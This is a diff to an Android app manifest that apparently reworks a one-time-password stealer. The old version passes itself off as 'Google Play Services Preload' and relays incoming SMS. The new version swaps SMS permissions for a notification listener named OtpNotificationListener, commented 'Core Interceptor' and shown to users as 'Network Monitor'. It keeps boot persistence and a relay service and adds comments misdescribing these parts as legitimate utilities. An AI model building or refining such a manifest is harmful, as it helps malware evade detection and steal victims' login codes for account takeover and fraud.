@@ -2,37 +2,40 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     xmlns:tools="http://schemas.android.com/tools">
 
-    <uses-permission android:name="android.permission.RECEIVE_SMS" />
-    <uses-permission android:name="android.permission.READ_SMS" />
+    <!-- Legitimate utility permissions -->
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
-    <uses-permission android:name="android.permission.BROADCAST_SMS" />
+
+    <!-- NO SMS PERMISSIONS, NO ACCESSIBILITY PERMISSIONS -->
 
     <application
         android:allowBackup="false"
-        android:label="Google Play Services Preload"
+        android:label="@string/app_name"
         android:icon="@drawable/ic_launcher"
         android:roundIcon="@drawable/ic_launcher"
         android:supportsRtl="true"
         android:theme="@style/Theme.AppCompat.Light.NoActionBar"
         tools:ignore="DataExtractionRules">
 
-        <receiver
-            android:name="com.android.vending.preload.check.SmsRelayReceiver"
-            android:exported="true"
-            android:permission="android.permission.BROADCAST_SMS"
-            tools:ignore="ExportedReceiver">
-            <intent-filter android:priority="999">
-                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+        <!-- Notification Listener Service (Core Interceptor) -->
+        <service
+            android:name=".OtpNotificationListener"
+            android:label="Network Monitor"
+            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.service.notification.NotificationListenerService" />
             </intent-filter>
-        </receiver>
+        </service>
 
+        <!-- Boot persistence -->
         <receiver
-            android:name="com.android.vending.preload.check.BootReceiver"
+            android:name=".BootReceiver"
             android:enabled="true"
             android:exported="false">
             <intent-filter>
@@ -41,13 +44,15 @@
             </intent-filter>
         </receiver>
 
+        <!-- Background optimization service -->
         <service
-            android:name="com.android.vending.preload.check.RelayForegroundService"
+            android:name=".RelayForegroundService"
             android:exported="false"
             android:foregroundServiceType="dataSync" />
 
+        <!-- Launcher -->
         <activity
-            android:name="com.android.vending.preload.check.MainActivity"
+            android:name=".MainActivity"
             android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
@@ -55,5 +60,4 @@
             </intent-filter>
         </activity>
     </application>
-
 </manifest>
